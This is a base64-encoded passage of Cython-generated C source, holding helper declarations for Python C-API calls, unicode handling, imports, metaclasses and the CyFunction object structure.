sIHZhbHVlKQojZGVmaW5lIF9fUHl4X1ZlY3RvcmNhbGxCdWlsZGVyX0FkZEFyZ1N0cihrZXksIHZhbHVlLCBidWlsZGVyLCBhcmdzLCBuKSBQeURpY3RfU2V0SXRlbVN0cmluZyhidWlsZGVyLCBrZXksIHZhbHVlKQojZW5kaWYKCgojaWYgQ1lUSE9OX1ZFQ1RPUkNBTEwgJiYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzA5MDAwMAojZGVmaW5lIF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsTWV0aG9kKG5hbWUsIGFyZ3MsIG5hcmdzZikgUHlPYmplY3RfVmVjdG9yY2FsbE1ldGhvZChuYW1lLCBhcmdzLCBuYXJnc2YsIE5VTEwpCiNlbHNlCnN0YXRpYyBQeU9iamVjdCAqX19QeXhfUHlPYmplY3RfRmFzdENhbGxNZXRob2QoUHlPYmplY3QgKm5hbWUsIFB5T2JqZWN0ICpjb25zdCAqYXJncywgc2l6ZV90IG5hcmdzZik7CiNlbmRpZgoKCnN0YXRpYyB2b2lkIF9fUHl4X1JhaXNlKFB5T2JqZWN0ICp0eXBlLCBQeU9iamVjdCAqdmFsdWUsIFB5T2JqZWN0ICp0YiwgUHlPYmplY3QgKmNhdXNlKTsKCgojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZCiAgICAjZGVmaW5lIF9fUHl4X1B5T2JqZWN0X0Zvcm1hdFNpbXBsZShzLCBmKSAoXAogICAgICAgIGxpa2VseShQeVVuaWNvZGVfQ2hlY2tFeGFjdChzKSkgPyAoUHlfSU5DUkVGKHMpLCBzKSA6XAogICAgICAgIFB5T2JqZWN0X0Zvcm1hdChzLCBmKSkKI2VsaWYgQ1lUSE9OX1VTRV9UWVBFX1NMT1RTCiAgICAjZGVmaW5lIF9fUHl4X1B5T2JqZWN0X0Zvcm1hdFNpbXBsZShzLCBmKSAoXAogICAgICAgIGxpa2VseShQeVVuaWNvZGVfQ2hlY2tFeGFjdChzKSkgPyAoUHlfSU5DUkVGKHMpLCBzKSA6XAogICAgICAgIGxpa2VseShQeUxvbmdfQ2hlY2tFeGFjdChzKSkgPyBQeUxvbmdfVHlwZS50cF9yZXByKHMpIDpcCiAgICAgICAgbGlrZWx5KFB5RmxvYXRfQ2hlY2tFeGFjdChzKSkgPyBQeUZsb2F0X1R5cGUudHBfcmVwcihzKSA6XAogICAgICAgIFB5T2JqZWN0X0Zvcm1hdChzLCBmKSkKI2Vsc2UKICAgICNkZWZpbmUgX19QeXhfUHlPYmplY3RfRm9ybWF0U2ltcGxlKHMsIGYpIChcCiAgICAgICAgbGlrZWx5KFB5VW5pY29kZV9DaGVja0V4YWN0KHMpKSA/IChQeV9JTkNSRUYocyksIHMpIDpcCiAgICAgICAgUHlPYmplY3RfRm9ybWF0KHMsIGYpKQojZW5kaWYKCgpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlVbmljb2RlX1VuaWNvZGUoUHlPYmplY3QgKm9iaik7CgoKc3RhdGljIFB5T2JqZWN0KiBfX1B5eF9QeVVuaWNvZGVfSm9pbihQeU9iamVjdCoqIHZhbHVlcywgUHlfc3NpemVfdCB2YWx1ZV9jb3VudCwgUHlfc3NpemVfdCByZXN1bHRfdWxlbmd0aCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQeV9VQ1M0IG1heF9jaGFyKTsKCgpzdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfUHlMb25nX0Jvb2xOZU9iakMoUHlPYmplY3QgKm9wMSwgUHlPYmplY3QgKm9wMiwgbG9uZyBpbnR2YWwsIGxvbmcgaW5wbGFjZSk7CgoKI2lmIENZVEhPTl9GQVNUX1RIUkVBRF9TVEFURQojZGVmaW5lIF9fUHl4X0V4Y2VwdGlvblN3YXAodHlwZSwgdmFsdWUsIHRiKSAgX19QeXhfX0V4Y2VwdGlvblN3YXAoX19weXhfdHN0YXRlLCB0eXBlLCB2YWx1ZSwgdGIpCnN0YXRpYyBDWVRIT05fSU5MSU5FIHZvaWQgX19QeXhfX0V4Y2VwdGlvblN3YXAoUHlUaHJlYWRTdGF0ZSAqdHN0YXRlLCBQeU9iamVjdCAqKnR5cGUsIFB5T2JqZWN0ICoqdmFsdWUsIFB5T2JqZWN0ICoqdGIpOwojZWxzZQpzdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkIF9fUHl4X0V4Y2VwdGlvblN3YXAoUHlPYmplY3QgKip0eXBlLCBQeU9iamVjdCAqKnZhbHVlLCBQeU9iamVjdCAqKnRiKTsKI2VuZGlmCgoKc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X1B5U2VxdWVuY2VfQ29udGFpbnNURihQeU9iamVjdCogaXRlbSwgUHlPYmplY3QqIHNlcSwgaW50IGVxKSB7CiAgICBpbnQgcmVzdWx0ID0gUHlTZXF1ZW5jZV9Db250YWlucyhzZXEsIGl0ZW0pOwogICAgcmV0dXJuIHVubGlrZWx5KHJlc3VsdCA8IDApID8gcmVzdWx0IDogKHJlc3VsdCA9PSAoZXEgPT0gUHlfRVEpKTsKfQoKCnN0YXRpYyBDWVRIT05fSU5MSU5FIHZvaWQgX19QeXhfUmFpc2VUb29NYW55VmFsdWVzRXJyb3IoUHlfc3NpemVfdCBleHBlY3RlZCk7CgoKc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCBfX1B5eF9SYWlzZU5lZWRNb3JlVmFsdWVzRXJyb3IoUHlfc3NpemVfdCBpbmRleCk7CgoKc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X0l0ZXJGaW5pc2godm9pZCk7CgoKc3RhdGljIGludCBfX1B5eF9JdGVybmV4dFVucGFja0VuZENoZWNrKFB5T2JqZWN0ICpyZXR2YWwsIFB5X3NzaXplX3QgZXhwZWN0ZWQpOwoKCnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9QeVVuaWNvZGVfQ29udGFpbnNURihQeU9iamVjdCogc3Vic3RyaW5nLCBQeU9iamVjdCogdGV4dCwgaW50IGVxKSB7CiAgICBpbnQgcmVzdWx0ID0gUHlVbmljb2RlX0NvbnRhaW5zKHRleHQsIHN1YnN0cmluZyk7CiAgICByZXR1cm4gdW5saWtlbHkocmVzdWx0IDwgMCkgPyByZXN1bHQgOiAocmVzdWx0ID09IChlcSA9PSBQeV9FUSkpOwp9CgoKc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X1B5T2JqZWN0X0dldFNsaWNlKAogICAgICAgIFB5T2JqZWN0KiBvYmosIFB5X3NzaXplX3QgY3N0YXJ0LCBQeV9zc2l6ZV90IGNzdG9wLAogICAgICAgIFB5T2JqZWN0KiogcHlfc3RhcnQsIFB5T2JqZWN0KiogcHlfc3RvcCwgUHlPYmplY3QqKiBweV9zbGljZSwKICAgICAgICBpbnQgaGFzX2NzdGFydCwgaW50IGhhc19jc3RvcCwgaW50IHdyYXBhcm91bmQpOwoKCiMgaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OCiAgICAjaWYgQ1lUSE9OX1JFRk5BTk5ZCiAgICAgICAgI2RlZmluZSBfX1B5eF9QeVVuaWNvZGVfQ29uY2F0SW5QbGFjZShsZWZ0LCByaWdodCkgX19QeXhfUHlVbmljb2RlX0NvbmNhdEluUGxhY2VJbXBsKCZsZWZ0LCByaWdodCwgX19weXhfcmVmbmFubnkpCiAgICAjZWxzZQogICAgICAgICNkZWZpbmUgX19QeXhfUHlVbmljb2RlX0NvbmNhdEluUGxhY2UobGVmdCwgcmlnaHQpIF9fUHl4X1B5VW5pY29kZV9Db25jYXRJblBsYWNlSW1wbCgmbGVmdCwgcmlnaHQpCiAgICAjZW5kaWYKICAgIHN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICpfX1B5eF9QeVVuaWNvZGVfQ29uY2F0SW5QbGFjZUltcGwoUHlPYmplY3QgKipwX2xlZnQsIFB5T2JqZWN0ICpyaWdodAogICAgICAgICNpZiBDWVRIT05fUkVGTkFOTlkKICAgICAgICAsIHZvaWQqIF9fcHl4X3JlZm5hbm55CiAgICAgICAgI2VuZGlmCiAgICApOwojZWxzZQojZGVmaW5lIF9fUHl4X1B5VW5pY29kZV9Db25jYXRJblBsYWNlIF9fUHl4X1B5VW5pY29kZV9Db25jYXQKI2VuZGlmCiNkZWZpbmUgX19QeXhfUHlVbmljb2RlX0NvbmNhdEluUGxhY2VTYWZlKGxlZnQsIHJpZ2h0KSAoKHVubGlrZWx5KChsZWZ0KSA9PSBQeV9Ob25lKSB8fCB1bmxpa2VseSgocmlnaHQpID09IFB5X05vbmUpKSA/XAogICAgUHlOdW1iZXJfSW5QbGFjZUFkZChsZWZ0LCByaWdodCkgOiBfX1B5eF9QeVVuaWNvZGVfQ29uY2F0SW5QbGFjZShsZWZ0LCByaWdodCkpCgoKI2RlZmluZSBfX1B5eF9QeVVuaWNvZGVfRnJvbUJJbnRfYmludCh2YWx1ZSlcCiAgICAoKHZhbHVlKSA/IF9fUHl4X05ld1JlZihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfVHJ1ZSkgOiBfX1B5eF9OZXdSZWYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0ZhbHNlKSkKCgpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlPYmplY3RfQ2FsbE5vQXJnKFB5T2JqZWN0ICpmdW5jKTsKCgpzdGF0aWMgaW50IF9fUHl4X1B5T2JqZWN0X0dldE1ldGhvZChQeU9iamVjdCAqb2JqLCBQeU9iamVjdCAqbmFtZSwgUHlPYmplY3QgKiptZXRob2QpOwoKCnN0YXRpYyBQeU9iamVjdCogX19QeXhfUHlPYmplY3RfQ2FsbE1ldGhvZDAoUHlPYmplY3QqIG9iaiwgUHlPYmplY3QqIG1ldGhvZF9uYW1lKTsKCgpzdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkIF9fUHl4X1JhaXNlTm9uZU5vdEl0ZXJhYmxlRXJyb3Iodm9pZCk7CgoKc3RhdGljIHZvaWQgX19QeXhfVW5wYWNrVHVwbGVFcnJvcihQeU9iamVjdCAqLCBQeV9zc2l6ZV90IGluZGV4KTsKCgpzdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfdW5wYWNrX3R1cGxlMigKICAgIFB5T2JqZWN0KiB0dXBsZSwgUHlPYmplY3QqKiB2YWx1ZTEsIFB5T2JqZWN0KiogdmFsdWUyLCBpbnQgaXNfdHVwbGUsIGludCBoYXNfa25vd25fc2l6ZSwgaW50IGRlY3JlZl90dXBsZSk7CnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF91bnBhY2tfdHVwbGUyX2V4YWN0KAogICAgUHlPYmplY3QqIHR1cGxlLCBQeU9iamVjdCoqIHZhbHVlMSwgUHlPYmplY3QqKiB2YWx1ZTIsIGludCBkZWNyZWZfdHVwbGUpOwpzdGF0aWMgaW50IF9fUHl4X3VucGFja190dXBsZTJfZ2VuZXJpYygKICAgIFB5T2JqZWN0KiB0dXBsZSwgUHlPYmplY3QqKiB2YWx1ZTEsIFB5T2JqZWN0KiogdmFsdWUyLCBpbnQgaGFzX2tub3duX3NpemUsIGludCBkZWNyZWZfdHVwbGUpOwoKCnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0KiBfX1B5eF9kaWN0X2l0ZXJhdG9yKFB5T2JqZWN0KiBkaWN0LCBpbnQgaXNfZGljdCwgUHlPYmplY3QqIG1ldGhvZF9uYW1lLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQeV9zc2l6ZV90KiBwX29yaWdfbGVuZ3RoLCBpbnQqIHBfaXNfZGljdCk7CnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9kaWN0X2l0ZXJfbmV4dChQeU9iamVjdCogZGljdF9vcl9pdGVyLCBQeV9zc2l6ZV90IG9yaWdfbGVuZ3RoLCBQeV9zc2l6ZV90KiBwcG9zLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUHlPYmplY3QqKiBwa2V5LCBQeU9iamVjdCoqIHB2YWx1ZSwgUHlPYmplY3QqKiBwaXRlbSwgaW50IGlzX2RpY3QpOwoKCiNpZiBDWVRIT05fVkVDVE9SQ0FMTCAmJiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMDkwMDAwCiNkZWZpbmUgX19QeXhfT2JqZWN0X1ZlY3RvcmNhbGxNZXRob2RfQ2FsbEZyb21CdWlsZGVyIFB5T2JqZWN0X1ZlY3RvcmNhbGxNZXRob2QKI2Vsc2UKc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9PYmplY3RfVmVjdG9yY2FsbE1ldGhvZF9DYWxsRnJvbUJ1aWxkZXIoUHlPYmplY3QgKm5hbWUsIFB5T2JqZWN0ICpjb25zdCAqYXJncywgc2l6ZV90IG5hcmdzZiwgUHlPYmplY3QgKmt3bmFtZXMpOwojZW5kaWYKCgojaWYgIUNZVEhPTl9VU0VfVFlQRV9TUEVDUyB8fCAoIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgJiYgUFlfVkVSU0lPTl9IRVggPCAweDAzMDkwMDAwKQojZGVmaW5lIF9fUHl4X2NhbGxfdHlwZV90cmF2ZXJzZShvLCBhbHdheXNfY2FsbCwgdmlzaXQsIGFyZykgMAojZWxzZQpzdGF0aWMgaW50IF9fUHl4X2NhbGxfdHlwZV90cmF2ZXJzZShQeU9iamVjdCAqbywgaW50IGFsd2F5c19jYWxsLCB2aXNpdHByb2MgdmlzaXQsIHZvaWQgKmFyZyk7CiNlbmRpZgoKCiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCnN0YXRpYyBQeU9iamVjdCAqX19QeXhfR2V0VHlwZURpY3QoUHlUeXBlT2JqZWN0ICp0cCk7CiNlbmRpZgoKCnN0YXRpYyBpbnQgX19QeXhfX1NldEl0ZW1PblR5cGVEaWN0KFB5VHlwZU9iamVjdCAqdHAsIFB5T2JqZWN0ICprLCBQeU9iamVjdCAqdik7CiNkZWZpbmUgX19QeXhfU2V0SXRlbU9uVHlwZURpY3QodHAsIGssIHYpIF9fUHl4X19TZXRJdGVtT25UeXBlRGljdCgoUHlUeXBlT2JqZWN0Kil0cCwgaywgdikKCgpzdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfZml4X3VwX2V4dGVuc2lvbl90eXBlX2Zyb21fc3BlYyhQeVR5cGVfU3BlYyAqc3BlYywgUHlUeXBlT2JqZWN0ICp0eXBlKTsKCgojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OIHx8IENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgfHwgQ1lUSE9OX1VTRV9UWVBFX1NQRUNTCnN0YXRpYyBpbnQgX19QeXhfdmFsaWRhdGVfYmFzZXNfdHVwbGUoY29uc3QgY2hhciAqdHlwZV9uYW1lLCBQeV9zc2l6ZV90IGRpY3RvZmZzZXQsIFB5T2JqZWN0ICpiYXNlcyk7CiNlbmRpZgoKCkNZVEhPTl9VTlVTRUQgc3RhdGljIGludCBfX1B5eF9QeVR5cGVfUmVhZHkoUHlUeXBlT2JqZWN0ICp0KTsKCgpzdGF0aWMgUHlPYmplY3QgKl9fUHl4X1B5TGlzdF9QYWNrKFB5X3NzaXplX3QgbiwgLi4uKTsKCgpzdGF0aWMgUHlPYmplY3QgKl9fUHl4X0ltcG9ydChQeU9iamVjdCAqbmFtZSwgUHlPYmplY3QgKmZyb21fbGlzdCwgaW50IGxldmVsKTsKCgpzdGF0aWMgUHlPYmplY3QqIF9fUHl4X0ltcG9ydEZyb20oUHlPYmplY3QqIG1vZHVsZSwgUHlPYmplY3QqIG5hbWUpOwoKCnN0YXRpYyBQeU9iamVjdCAqX19QeXhfSW1wb3J0RG90dGVkTW9kdWxlKFB5T2JqZWN0ICpuYW1lLCBQeU9iamVjdCAqcGFydHNfdHVwbGUpOwpzdGF0aWMgUHlPYmplY3QgKl9fUHl4X0ltcG9ydERvdHRlZE1vZHVsZV9XYWxrUGFydHMoUHlPYmplY3QgKm1vZHVsZSwgUHlPYmplY3QgKm5hbWUsIFB5T2JqZWN0ICpwYXJ0c190dXBsZSk7CgoKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTiAmJiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwZDAwMDAKI2RlZmluZSBfX1B5eF9TZXROYW1lSW5DbGFzcyhucywgbmFtZSwgdmFsdWUpXAogICAgKGxpa2VseShQeURpY3RfQ2hlY2tFeGFjdChucykpID8gX1B5RGljdF9TZXRJdGVtX0tub3duSGFzaChucywgbmFtZSwgdmFsdWUsICgoUHlBU0NJSU9iamVjdCAqKSBuYW1lKS0+aGFzaCkgOiBQeU9iamVjdF9TZXRJdGVtKG5zLCBuYW1lLCB2YWx1ZSkpCiNlbGlmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTgojZGVmaW5lIF9fUHl4X1NldE5hbWVJbkNsYXNzKG5zLCBuYW1lLCB2YWx1ZSlcCiAgICAobGlrZWx5KFB5RGljdF9DaGVja0V4YWN0KG5zKSkgPyBQeURpY3RfU2V0SXRlbShucywgbmFtZSwgdmFsdWUpIDogUHlPYmplY3RfU2V0SXRlbShucywgbmFtZSwgdmFsdWUpKQojZWxzZQojZGVmaW5lIF9fUHl4X1NldE5hbWVJbkNsYXNzKG5zLCBuYW1lLCB2YWx1ZSkgIFB5T2JqZWN0X1NldEl0ZW0obnMsIG5hbWUsIHZhbHVlKQojZW5kaWYKCgpzdGF0aWMgUHlPYmplY3QgKl9fUHl4X0NhbGN1bGF0ZU1ldGFjbGFzcyhQeVR5cGVPYmplY3QgKm1ldGFjbGFzcywgUHlPYmplY3QgKmJhc2VzKTsKCgpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlPYmplY3RfQ2FsbDJBcmdzKFB5T2JqZWN0KiBmdW5jdGlvbiwgUHlPYmplY3QqIGFyZzEsIFB5T2JqZWN0KiBhcmcyKTsKCgpzdGF0aWMgUHlPYmplY3QgKl9fUHl4X1B5M01ldGFjbGFzc1ByZXBhcmUoUHlPYmplY3QgKm1ldGFjbGFzcywgUHlPYmplY3QgKmJhc2VzLCBQeU9iamVjdCAqbmFtZSwgUHlPYmplY3QgKnF1YWxuYW1lLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUHlPYmplY3QgKm1rdywgUHlPYmplY3QgKm1vZG5hbWUsIFB5T2JqZWN0ICpkb2MpOwpzdGF0aWMgUHlPYmplY3QgKl9fUHl4X1B5M0NsYXNzQ3JlYXRlKFB5T2JqZWN0ICptZXRhY2xhc3MsIFB5T2JqZWN0ICpuYW1lLCBQeU9iamVjdCAqYmFzZXMsIFB5T2JqZWN0ICpkaWN0LAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFB5T2JqZWN0ICpta3csIGludCBjYWxjdWxhdGVfbWV0YWNsYXNzLCBpbnQgYWxsb3dfcHkyX21ldGFjbGFzcyk7CgoKc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9GZXRjaFNoYXJlZEN5dGhvbkFCSU1vZHVsZSh2b2lkKTsKCgpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqX19QeXhfUHlEaWN0X1NldERlZmF1bHQoUHlPYmplY3QgKmQsIFB5T2JqZWN0ICprZXksIFB5T2JqZWN0ICpkZWZhdWx0X3ZhbHVlLCBpbnQgaXNfc2FmZV90eXBlKTsKCgpzdGF0aWMgUHlUeXBlT2JqZWN0KiBfX1B5eF9GZXRjaENvbW1vblR5cGVGcm9tU3BlYyhQeVR5cGVPYmplY3QgKm1ldGFjbGFzcywgUHlPYmplY3QgKm1vZHVsZSwgUHlUeXBlX1NwZWMgKnNwZWMsIFB5T2JqZWN0ICpiYXNlcyk7CgoKc3RhdGljIGludCBfX3B5eF9Db21tb25UeXBlc01ldGFjbGFzc19pbml0KFB5T2JqZWN0ICptb2R1bGUpOwojZGVmaW5lIF9fUHl4X0NvbW1vblR5cGVzTWV0YWNsYXNzX1VTRUQKCgpzdGF0aWMgUHlPYmplY3QgKl9fUHl4X1B5TWV0aG9kX05ldyhQeU9iamVjdCAqZnVuYywgUHlPYmplY3QgKnNlbGYsIFB5T2JqZWN0ICp0eXApOwoKCiNpZiBDWVRIT05fTUVUSF9GQVNUQ0FMTCAmJiAoQ1lUSE9OX1ZFQ1RPUkNBTEwgfHwgQ1lUSE9OX0JBQ0tQT1JUX1ZFQ1RPUkNBTEwpCnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICpfX1B5eF9QeVZlY3RvcmNhbGxfRmFzdENhbGxEaWN0KFB5T2JqZWN0ICpmdW5jLCBfX3B5eF92ZWN0b3JjYWxsZnVuYyB2YywgUHlPYmplY3QgKmNvbnN0ICphcmdzLCBzaXplX3QgbmFyZ3MsIFB5T2JqZWN0ICprdyk7CiNlbmRpZgoKCiNkZWZpbmUgX19QeXhfQ3lGdW5jdGlvbl9VU0VECiNkZWZpbmUgX19QeXhfQ1lGVU5DVElPTl9TVEFUSUNNRVRIT0QgIDB4MDEKI2RlZmluZSBfX1B5eF9DWUZVTkNUSU9OX0NMQVNTTUVUSE9EICAgMHgwMgojZGVmaW5lIF9fUHl4X0NZRlVOQ1RJT05fQ0NMQVNTICAgICAgICAweDA0CiNkZWZpbmUgX19QeXhfQ1lGVU5DVElPTl9DT1JPVVRJTkUgICAgIDB4MDgKI2RlZmluZSBfX1B5eF9DeUZ1bmN0aW9uX0dldENsb3N1cmUoZilcCiAgICAoKChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICopIChmKSktPmZ1bmNfY2xvc3VyZSkKI2lmIFBZX1ZFUlNJT05fSEVYIDwgMHgwMzA5MDBCMSB8fCBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiAgI2RlZmluZSBfX1B5eF9DeUZ1bmN0aW9uX0dldENsYXNzT2JqKGYpXAogICAgICAoKChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICopIChmKSktPmZ1bmNfY2xhc3NvYmopCiNlbHNlCiAgI2RlZmluZSBfX1B5eF9DeUZ1bmN0aW9uX0dldENsYXNzT2JqKGYpXAogICAgICAoKFB5T2JqZWN0KikgKChQeUNNZXRob2RPYmplY3QgKikgKGYpKS0+bW1fY2xhc3MpCiNlbmRpZgojZGVmaW5lIF9fUHl4X0N5RnVuY3Rpb25fU2V0Q2xhc3NPYmooZiwgY2xhc3NvYmopXAogICAgX19QeXhfX0N5RnVuY3Rpb25fU2V0Q2xhc3NPYmooKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKikgKGYpLCAoY2xhc3NvYmopKQojZGVmaW5lIF9fUHl4X0N5RnVuY3Rpb25fRGVmYXVsdHModHlwZSwgZilcCiAgICAoKHR5cGUgKikoKChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICopIChmKSktPmRlZmF1bHRzKSkKI2RlZmluZSBfX1B5eF9DeUZ1bmN0aW9uX1NldERlZmF1bHRzR2V0dGVyKGYsIGcpXAogICAgKChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICopIChmKSktPmRlZmF1bHRzX2dldHRlciA9IChnKQp0eXBlZGVmIHN0cnVjdCB7CiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiAgICBQeU9iamVjdF9IRUFECiAgICBQeU9iamVjdCAqZnVuYzsKI2VsaWYgUFlfVkVSU0lPTl9IRVggPCAweDAzMDkwMEIxCiAgICBQeUNGdW5jdGlvbk9iamVjdCBmdW5jOwojZWxzZQogICAgUHlDTWV0aG9kT2JqZWN0IGZ1bmM7CiNlbmRpZgojaWYgQ1lUSE9OX0JBQ0tQT1JUX1ZFQ1RPUkNBTEwgfHxcCiAgICAgICAgKENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgJiYgQ1lUSE9OX01FVEhfRkFTVENBTEwpCiAgICBfX3B5eF92ZWN0b3JjYWxsZnVuYyBmdW5jX3ZlY3RvcmNhbGw7CiNlbmRpZgojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICAgUHlPYmplY3QgKmZ1bmNfd2Vha3JlZmxpc3Q7CiNlbmRpZgogICAgUHlPYmplY3QgKmZ1bmNfZGljdDsKICAgIFB5T2JqZWN0ICpmdW5jX25hbWU7CiAgICBQeU9iamVjdCAqZnVuY19xdWFsbmFtZTsKICAgIFB5T2JqZWN0ICpmdW5jX2RvYzsKICAgIFB5T2JqZWN0ICpmdW5jX2dsb2JhbHM7CiAgICBQeU9iamVjdCAqZnVuY19jb2RlOwogICAgUHlPYmplY3QgKmZ1bmNfY2xvc3VyZTsKI2lmIFBZX1ZFUlNJT05fSEVYIDwgMHgwMzA5MDBCMSB8fCBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiAgICBQeU9iamVjdCAqZnVuY19jbGFzc29iajsKI2VuZGlmCiAgICBQeU9iamVjdCAqZGVmYXVsdHM7CiAgICBpbnQgZmxhZ3M7CiAgICBQeU9iamVjdCAqZGVmYXVsdHNfdHVwbGU7CiAgICBQeU9iamVjdCAqZGVmYXVsdHNfa3dkaWN0OwogICAgUHlPYmplY3QgKigqZGVmYXVsdHNfZ2V0dGVyKShQeU9iamVjdCAqKTsKICAgIFB5T2JqZWN0ICpmdW5jX2Fubm90YXRpb25zOwogICAgUHlPYmplY3QgKmZ1bmNfaXNfY29yb3V0aW5lOwp9IF9fcHl4X0N5RnVuY3Rpb25PYmplY3Q7CiN1bmRlZiBfX1B5eF9DeU9yUHlDRnVuY3Rpb25fQ2hlY2sKI2RlZmluZSBfX1B5eF9DeUZ1bmN0aW9uX0NoZWNrKG9iaikgIF9fUHl4X1R5cGVDaGVjayhvYmosIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X0N5RnVuY3Rpb25UeXBlKQojZGVmaW5lIF9fUHl4X0N5T3JQeUNGdW5jdGlvbl9DaGVjayhvYmopICBfX1B5eF9UeXBlQ2hlY2syKG9iaiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfQ3lGdW5jdGlvblR5cGUsICZQeUNGdW5jdGlvbl9UeXBlKQojZGVmaW5lIF9fUHl4X0N5RnVuY3Rpb25fQ2hlY2tFeGFjdChvYmopICBfX1B5eF9JU19UWVBFKG9iaiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfQ3lGdW5jdGlvblR5cGUpCnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9fSXNTYW1lQ3lPckNGdW5jdGlvbihQeU9iamVjdCAqZnVuYywgdm9pZCAoKmNmdW5jKSh2b2lkKSk7CiN1bmRlZiBfX1B5eF9Jc1NhbWVDRnVuY3Rpb24KI2RlZmluZSBfX1B5eF9Jc1NhbWVDRnVuY3Rpb24oZnVuYywgY2Z1bmMpICAgX19QeXhfX0lzU2FtZUN5T3JDRnVuY3Rpb24oZnVuYywgY2Z1bmMpCnN0YXRpYyBQeU9iamVjdCAqX19QeXhfQ3lGdW5jdGlvbl9Jbml0KF9fcHl4X0N5RnVuY3Rpb25PYmplY3QqIG9wLCBQeU1ldGhvZERlZiAqbWwsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaW50IGZsYWdzLCBQeU9iamVjdCogcXVhbG5hbWUsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUHlPYmplY3QgKmNsb3N1cmUsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUHlPYmplY3QgKm1vZHVsZSwgUHlPYmplY3QgKmdsb2JhbHMsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUHlPYmplY3QqIGNvZGUpOwpzdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkIF9fUHl4X19DeUZ1bmN0aW9uX1NldENsYXNzT2JqKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QqIGYsIFB5T2JqZWN0KiBjbGFzc29iaik7CnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICpfX1B5eF9DeUZ1bmN0aW9uX0luaXREZWZhdWx0cyhQeU9iamVjdCAqZnVuYywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUHlUeXBlT2JqZWN0ICpkZWZhdWx0c190eXBlKTsKc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCBfX1B5eF9DeUZ1bmN0aW9uX1NldERlZmF1bHRzVHVwbGUoUHlPYmplY3QgKm0sCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFB5T2JqZWN0ICp0dXBsZSk7CnN0YXRpYyBDWVRIT05fSU5MSU5FIHZvaWQgX19QeXhfQ3lGdW5jdGlvbl9TZXREZWZhdWx0c0t3RGljdChQeU9iamVjdCAqbSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFB5T2JqZWN0ICpkaWN0KTsKc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCBfX1B5eF9DeU